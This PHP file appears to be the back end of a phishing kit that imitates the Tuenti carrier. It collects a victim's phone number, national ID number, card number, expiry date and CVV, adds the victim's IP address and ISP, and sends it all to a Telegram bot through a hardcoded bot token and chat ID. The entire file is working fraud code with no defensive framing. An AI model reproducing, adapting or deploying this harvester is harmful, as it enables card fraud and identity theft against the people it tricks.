<?php
$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$msg .= "
➖➖➖➖[ TUENTI 2022 ]➖➖➖➖
👤 TELEFONO : " . $_SESSION['name'] = $_POST['name'] . "
🪪 DNI : " . $_SESSION['dni'] = $_POST['dni'] . "
💳 TARJETA : " . $_SESSION['card'] = $_POST['card'] . "
💳 VENCIMIENTO : " . $_SESSION['venc'] = $_POST['venc'] . "
💳 CVV : " . $_SESSION['cvv'] = $_POST['cvv'] . "
➖➖➖ INFO DE CONECCION ➖➖➖
🌐 IP : $ip
🌐 ISP : $isp
➖➖➖➖➖➖➖➖➖➖➖➖➖➖";
define('BOT_TOKEN', '5753333751:AAGKXx8xQZNMQufiCtAFRtJlXZWpO7XhSG0');
define('CHAT_ID', '5745356040');
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');

enviar_telegram($msg);

function enviar_telegram($msj)  {
	$queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}

header("");
?>
